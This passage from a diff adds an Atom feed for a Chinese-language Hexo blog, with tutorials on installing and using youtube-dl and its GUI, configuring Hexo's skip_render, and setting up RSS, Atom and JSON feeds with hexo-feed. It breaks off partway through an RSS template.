+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;sudo curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/&lt;span class=&#34;hljs-built_in&#34;&gt;local&lt;/span&gt;/bin/youtube-dl&lt;br&gt;&lt;br&gt;sudo chmod a+rx /usr/&lt;span class=&#34;hljs-built_in&#34;&gt;local&lt;/span&gt;/bin/youtube-dl&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;透過 python 安裝&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;sudo pip install --upgrade youtube_dl&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Mac 可以透過 homebrew 安裝&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;sudo pip install --upgrade youtube_dl&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;更新&#34;&gt;&lt;a href=&#34;#更新&#34; class=&#34;headerlink&#34; title=&#34;更新&#34;&gt;&lt;/a&gt;更新&lt;/h2&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;youtube-dl -U&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Linux 若是用套件管理器(例如 man, apt)安裝，就用套件管理器更新&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;下載影片&#34;&gt;&lt;a href=&#34;#下載影片&#34; class=&#34;headerlink&#34; title=&#34;下載影片&#34;&gt;&lt;/a&gt;下載影片&lt;/h2&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# Windows&lt;/span&gt;&lt;br&gt;youtube-dl.exe &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# Linux&lt;/span&gt;&lt;br&gt;youtube-dl &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;使用指令介面不像視窗版是點開後才給設定或操作，&lt;br&gt;大多都是先把設定參數都一起寫在啟動指令中&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;用 Ctrl + C 可以終止執行中的指令&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;如果網址內有特殊符號，可以用字串標記 “URL”&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;通常指令介面的程式會保留 &lt;code&gt;-h&lt;/code&gt; &lt;code&gt;--help&lt;/code&gt; 做使用說明&lt;/p&gt;
+&lt;p&gt;如果不會操作，可以參考使用說明&lt;/p&gt;
+&lt;h2 id=&#34;下載播放清單&#34;&gt;&lt;a href=&#34;#下載播放清單&#34; class=&#34;headerlink&#34; title=&#34;下載播放清單&#34;&gt;&lt;/a&gt;下載播放清單&lt;/h2&gt;&lt;p&gt;下載撥放清單跟下載影片一樣，把網址換成撥放清單&lt;/p&gt;
+&lt;h3 id=&#34;指定播放清單下載範圍&#34;&gt;&lt;a href=&#34;#指定播放清單下載範圍&#34; class=&#34;headerlink&#34; title=&#34;指定播放清單下載範圍&#34;&gt;&lt;/a&gt;指定播放清單下載範圍&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--playlist-start&lt;/code&gt;：播放清單起始位置&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--playlist-end&lt;/code&gt;：播放清單結束位置&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--playlist-items&lt;/code&gt;：指定範圍，逗號分隔，例如：1,2,5,8, 1-3,7,10-13&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;只下載音樂&#34;&gt;&lt;a href=&#34;#只下載音樂&#34; class=&#34;headerlink&#34; title=&#34;只下載音樂&#34;&gt;&lt;/a&gt;只下載音樂&lt;/h2&gt;&lt;p&gt;用 &lt;code&gt;-x&lt;/code&gt; 只輸出音軌，&lt;code&gt;--audio-format&lt;/code&gt; 指定輸出檔的格式&lt;/p&gt;
+&lt;figure class=&#34;highlight vim&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs vim&#34;&gt;youtube-&lt;span class=&#34;hljs-keyword&#34;&gt;dl&lt;/span&gt; -&lt;span class=&#34;hljs-keyword&#34;&gt;x&lt;/span&gt; --audio-format mp3 http&lt;span class=&#34;hljs-variable&#34;&gt;s:&lt;/span&gt;//www.youtube.&lt;span class=&#34;hljs-keyword&#34;&gt;com&lt;/span&gt;/watch?v=WI-EMzrUSP4&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;其他參數：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--embed-thumbnail&lt;/code&gt;：嵌入影片縮圖(僅限 mp3 和 m4a/mp4)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--add-metadata&lt;/code&gt;：加入影片資訊&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;參考來源&#34;&gt;&lt;a href=&#34;#參考來源&#34; class=&#34;headerlink&#34; title=&#34;參考來源&#34;&gt;&lt;/a&gt;參考來源&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/ytdl-org/youtube-dl/blob/master/README.md&#34;&gt;https://github.com/ytdl-org/youtube-dl/blob/master/README.md&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://junyussh.github.io/p/use-youtube-dl-to-download-videos/&#34;&gt;https://junyussh.github.io/p/use-youtube-dl-to-download-videos/&lt;/a&gt;&lt;/p&gt;
+</content>
+        <category term="Windows" />
+        <category term="Linux" />
+        <category term="Mac" />
+        <updated>2021-12-19T08:45:13.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2021/12/15/hexo-skip/</id>
+        <title>Hexo 指定文件跳過渲染</title>
+        <link rel="alternate" href="https://zonego.tw/2021/12/15/hexo-skip/"/>
+        <content type="html">&lt;p&gt;Hexo 在編譯時，會將&lt;code&gt;source&lt;/code&gt;下的md以及html檔，都套用主題後產生成html&lt;/p&gt;
+&lt;p&gt;若有些頁面原本就是設計好的，不要套用主題的話，就要改設定去跳過了&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;h2 id=&#34;修改設定&#34;&gt;&lt;a href=&#34;#修改設定&#34; class=&#34;headerlink&#34; title=&#34;修改設定&#34;&gt;&lt;/a&gt;修改設定&lt;/h2&gt;&lt;p&gt;詳細請看 Hexo 的&lt;a href=&#34;https://hexo.io/zh-tw/docs/configuration.html&#34;&gt;官方文件&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;開啟 &lt;code&gt;_config.yml&lt;/code&gt; 修改 skip_render 欄位可以設定渲染時要跳過的文件&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;這邊的設定與 exclude 不同，用 exclude 排除後，&lt;br&gt;在編譯時不會將原檔複製到 public 內，包括佈署時也是。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;跳過單一文件&#34;&gt;&lt;a href=&#34;#跳過單一文件&#34; class=&#34;headerlink&#34; title=&#34;跳過單一文件&#34;&gt;&lt;/a&gt;跳過單一文件&lt;/h3&gt;&lt;p&gt;若要跳過 source 下的 test.html&lt;/p&gt;
+&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;skip_render:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;test.html&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 或是&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;skip_render:&lt;/span&gt; [&lt;span class=&#34;hljs-string&#34;&gt;test.html&lt;/span&gt;]&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 或是&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;skip_render:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;test.html&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;若是跳過 source/abc 下的 test.html，就寫 abc/test.html&lt;br&gt;路徑不要寫成絕對位置，這邊的路徑都寫 source 下的相對位置&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;跳過多個文件&#34;&gt;&lt;a href=&#34;#跳過多個文件&#34; class=&#34;headerlink&#34; title=&#34;跳過多個文件&#34;&gt;&lt;/a&gt;跳過多個文件&lt;/h3&gt;&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;skip_render:&lt;/span&gt; [&lt;span class=&#34;hljs-string&#34;&gt;test.html&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;test2.html&lt;/span&gt;]&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 或是&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;skip_render:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;test.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;test2.html&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;使用規則命名&#34;&gt;&lt;a href=&#34;#使用規則命名&#34; class=&#34;headerlink&#34; title=&#34;使用規則命名&#34;&gt;&lt;/a&gt;使用規則命名&lt;/h3&gt;&lt;p&gt;skip_render 欄位可以用 &lt;a href=&#34;https://github.com/micromatch/micromatch#extended-globbing&#34;&gt;glob 表達式&lt;/a&gt;表示符合規則的檔名&lt;/p&gt;
+&lt;p&gt;例如:&lt;/p&gt;
+&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 跳過所有 test 開頭的檔案&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;skip_render:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;test*&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 跳過所有 test 開頭的 html 檔案&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;skip_render:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;test*.html&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 跳過所有 abc 資料夾內的檔案&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;skip_render:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;abc/*&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 跳過所有 abc 資料夾內的檔案包含目錄&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;skip_render:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;abc/**&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;參考資料&#34;&gt;&lt;a href=&#34;#參考資料&#34; class=&#34;headerlink&#34; title=&#34;參考資料&#34;&gt;&lt;/a&gt;參考資料&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://hexo.io/zh-tw/docs/configuration.html&#34;&gt;https://hexo.io/zh-tw/docs/configuration.html&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://iitii.github.io/2019/02/15/1/&#34;&gt;https://iitii.github.io/2019/02/15/1/&lt;/a&gt;&lt;/p&gt;
+</content>
+        <category term="Blog" />
+        <category term="Hexo" />
+        <updated>2021-12-15T01:41:37.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2021/12/10/youtube-dlg/</id>
+        <title>開源線上影片下載工具 youtube-dl gui</title>
+        <link rel="alternate" href="https://zonego.tw/2021/12/10/youtube-dlg/"/>
+        <content type="html">&lt;p&gt;你想下載 Youtube、Facebook 或是 twitter 上的影片嗎?&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;p&gt;用 youtube-dl 保證藥到病除&lt;/p&gt;
+&lt;p&gt;雖然名稱叫youtube下載，但 &lt;a href=&#34;https://ytdl-org.github.io/youtube-dl/supportedsites.html&#34;&gt;youtube-dl支援的網站&lt;/a&gt; 多達一千多個&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;如果你需要更多功能，而且不排斥指令介面&lt;/p&gt;
+&lt;p&gt;那你可以改用 &lt;a href=&#34;/2021/12/19/youtuve-dl/&#34;&gt;&lt;strong&gt;youtube-dl&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Youtube-dl-Gui&#34;&gt;&lt;a href=&#34;#Youtube-dl-Gui&#34; class=&#34;headerlink&#34; title=&#34;Youtube-dl Gui&#34;&gt;&lt;/a&gt;Youtube-dl Gui&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://mrs0m30n3.github.io/youtube-dl-gui/&#34;&gt;官網在這&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/MrS0m30n3/youtube-dl-gui&#34;&gt;&lt;i class=&#34;nexmoefont icon-github&#34;&gt;&lt;/i&gt; Github&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;youtube-dl gui 目前只有 Windows 版(還有沒中文)，在官網下載 Installer 即可安裝&lt;/p&gt;
+&lt;p&gt;下載完還是 zip 壓縮檔，需要先解壓縮再安裝&lt;/p&gt;
+&lt;p&gt;打開之後長這樣&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/youtube-dlg.jpg&#34; alt=&#34;gui&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用前先設定下載位置&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/youtube-dlg-path.jpg&#34; alt=&#34;gui&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;把要下載的影片網址貼這裡，一行一個影片&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/youtube-dlg-url.jpg&#34; alt=&#34;gui&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;再來選要下載的格式，影片可以選 webp, mp4，音樂可以選 mp3, m4a&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/youtube-dlg-format.jpg&#34; alt=&#34;gui&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;新增到下到駐列&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/youtube-dlg-queue.jpg&#34; alt=&#34;gui&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;開始下載&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/youtube-dlg-dl.jpg&#34; alt=&#34;gui&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;等到跑完，就可以在資料夾內找到影片檔啦🎉&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/youtube-dlg-dl2.jpg&#34; alt=&#34;gui&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/youtube-dlg-done.jpg&#34; alt=&#34;gui&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;小抱怨… Youtube 最近好像開始防機器人，下載速度變超慢&lt;/p&gt;
+</content>
+        <category term="Windows" />
+        <updated>2021-12-10T13:42:20.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2021/12/09/hexo-rss/</id>
+        <title>增加 Hexo 的 RSS, ATOM, JSON Feed 訂閱功能</title>
+        <link rel="alternate" href="https://zonego.tw/2021/12/09/hexo-rss/"/>
+        <content type="html">&lt;p&gt;RSS(Really Simple Syndication) 是用 xml 定義的標準格式，用來把新聞、部落格文章或是 Podcast 更新資訊彙整到一個地方&lt;/p&gt;
+&lt;p&gt;衍生出的格式有 Atom, Json Feed 等格式&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;p&gt;既然都做部落格了，當然要提供訂閱功能。(加減多點流量)&lt;/p&gt;
+&lt;p&gt;在 Hexo 內可以使用 &lt;code&gt;Hexo-Feed&lt;/code&gt; 插件幫我們產生 RSS, Atom 還有 Json Feed 的檔案&lt;/p&gt;
+&lt;p&gt;Hexo-feed &lt;a href=&#34;https://github.com/sergeyzwezdin/hexo-feed&#34;&gt;&lt;i class=&#34;nexmoefont icon-github&#34;&gt;&lt;/i&gt; GitHub&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;安裝&#34;&gt;&lt;a href=&#34;#安裝&#34; class=&#34;headerlink&#34; title=&#34;安裝&#34;&gt;&lt;/a&gt;安裝&lt;/h2&gt;&lt;h3 id=&#34;需要版本&#34;&gt;&lt;a href=&#34;#需要版本&#34; class=&#34;headerlink&#34; title=&#34;需要版本&#34;&gt;&lt;/a&gt;需要版本&lt;/h3&gt;&lt;p&gt;Hexo 4.X+&lt;br&gt;NodeJS 12+&lt;/p&gt;
+&lt;h3 id=&#34;安裝指令&#34;&gt;&lt;a href=&#34;#安裝指令&#34; class=&#34;headerlink&#34; title=&#34;安裝指令&#34;&gt;&lt;/a&gt;安裝指令&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;npm install hexo-feed --save-dev&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;製作模板檔案&#34;&gt;&lt;a href=&#34;#製作模板檔案&#34; class=&#34;headerlink&#34; title=&#34;製作模板檔案&#34;&gt;&lt;/a&gt;製作模板檔案&lt;/h3&gt;&lt;p&gt;新增對應的模板檔案&lt;/p&gt;
+&lt;p&gt;RSS: &lt;code&gt;themes/layout/template/rss.ejs&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs html&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;rss&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;version&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;channel&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= config.title %&amp;gt;&amp;lt;%= tag ? ` • Posts by &amp;quot;$&amp;#123;tag&amp;#125;&amp;quot; tag` : &amp;#x27;&amp;#x27; %&amp;gt;&amp;lt;%= category ? ` • Posts by &amp;quot;$&amp;#123;category&amp;#125;&amp;quot; category` : &amp;#x27;&amp;#x27; %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;link&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= config.url %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;link&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;description&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= config.description %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;description&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;language&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= config.language %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;language&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;pubDate&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= moment(lastBuildDate).locale(&amp;#x27;en&amp;#x27;).format(&amp;#x27;ddd, DD MMM YYYY HH:mm:ss ZZ&amp;#x27;) %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;pubDate&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;lastBuildDate&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= moment(lastBuildDate).locale(&amp;#x27;en&amp;#x27;).format(&amp;#x27;ddd, DD MMM YYYY HH:mm:ss ZZ&amp;#x27;) %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;lastBuildDate&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &amp;lt;%_ for (const &amp;#123; name &amp;#125; of (tags || [])) &amp;#123; _%&amp;gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;category&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= name %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;category&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &amp;lt;%_ &amp;#125; _%&amp;gt;&lt;br&gt;        &amp;lt;%_ for (const post of posts) &amp;#123; _%&amp;gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;guid&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;isPermalink&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= post.permalink %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;guid&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= post.title %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;link&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= post.permalink %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;link&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;            &amp;lt;%_ for (const tag of (post.tags ? post.tags.toArray() : [])) &amp;#123; _%&amp;gt;&lt;br&gt;            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;category&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= tag.name %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;category&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;            &amp;lt;%_ &amp;#125; _%&amp;gt;&lt;br&gt;            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;pubDate&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= moment(post.date).locale(&amp;#x27;en&amp;#x27;).format(&amp;#x27;ddd, DD MMM YYYY HH:mm:ss ZZ&amp;#x27;) %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;pubDate&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;description&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;![CDATA[ &amp;lt;%= post.content %&amp;gt; ]]&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;description&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &amp;lt;%_ &amp;#125; _%&amp;gt;&lt;br&gt;    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;channel&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span 